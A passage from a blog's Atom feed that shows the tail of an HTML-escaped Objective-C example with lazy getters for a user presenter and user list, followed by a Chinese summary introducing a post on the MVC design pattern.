cell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#pragma mark - getters and setters</span><br><span class="line">- (UserPresenter *)userPresenter &#123;</span><br><span class="line">    if (_userPresenter &#x3D;&#x3D; nil) &#123;</span><br><span class="line">        UserService *userService &#x3D; [[UserService alloc] init];</span><br><span class="line">        _userPresenter &#x3D; [[UserPresenter alloc] initWithUserService:userService];</span><br><span class="line">    &#125;</span><br><span class="line">    return _userPresenter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (NSArray *)usersToDisplay &#123;</span><br><span class="line">    if (_usersToDisplay &#x3D;&#x3D; nil) &#123;</span><br><span class="line">        _usersToDisplay &#x3D; [NSArray array];</span><br><span class="line">    &#125; </span><br><span class="line">    return _usersToDisplay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;软件开发中，最常见的设计模式是&lt;code&gt;Model-View-Controller&lt;/code&gt;(MVC)，&lt;code&gt;MVC&lt;/code
      
    
    </summary>
    
    
    
      <category term="Technology" scheme="http://xsenyu.github.io/tags/Technology/"/>
    
  </entry>
  
</feed>
